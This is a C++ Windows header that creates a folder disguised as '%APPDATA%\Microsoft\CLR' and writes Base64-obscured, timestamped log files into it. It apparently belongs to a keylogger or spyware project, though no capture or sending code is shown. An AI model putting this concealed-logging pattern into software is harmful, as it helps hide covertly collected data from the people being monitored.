#ifndef _IO_H
#define _IO_H

#include <string>
#include <cstdlib>
#include <Windows.h>
#include <fstream>
#include "Helper.h"
#include "Base64.h"

namespace IO
{
    std::string GetOurPath(const bool append_separator = false)
    {
        char* APPDATA;
        size_t len;
        errno_t err = _dupenv_s(&APPDATA, &len, "APPDATA");
        std::string appdata_dir{ APPDATA };
        std::string full = appdata_dir + "\\Microsoft\\CLR";
        return full + (append_separator ? "\\" : "");
    }

    bool MkOneDr(std::string path)
    {
        return static_cast<bool>(CreateDirectoryA(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS);
    }

    bool MKDir(std::string path)
    {
        for(char &c : path)
        {
            if (c == '\\')
            {
                c = '\0';
                if (!MkOneDr(path))
                    return false;
                c = '\\';
            }
        }
        return true;
    }

    template <class T>
    std::string WriteLog(const T &t)
    {
        std::string path = GetOurPath(true);
        Helper::DateTime dt;
        std::string name = dt.GetDateTimeString("_") + ".log";

        try
        {
            std::ofstream file(path + name);
            if (!file) return "";

            std::ostringstream s;
            s << "[" << dt.GetDateTimeString() << "] " << t << std::endl;
            std::string data = Base64::EncryptB64(s.str());

            file << data;
            if (!file) return "";

            file.close();
            return name;
        }
        catch (...)
        {
            return "";
        }
    }
}

#endif // !_IO_H